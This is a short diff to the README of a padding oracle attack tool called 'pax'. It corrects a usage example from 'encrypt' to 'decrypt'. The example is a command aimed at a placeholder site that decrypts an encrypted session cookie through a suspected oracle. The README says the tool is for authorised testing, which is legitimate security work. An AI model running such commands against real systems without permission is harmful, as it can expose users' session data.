@@ -19,7 +19,7 @@ As always, this tool should only be used on systems you own and/or have permissi
 If you find a suspected oracle, where the encrypted data is stored inside a cookie named `SESS`, you can use the following:
 
 ```bash
-pax encrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D"
+pax decrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D"
 ```
 
 This will hopefully give you some plaintext, perhaps something like:
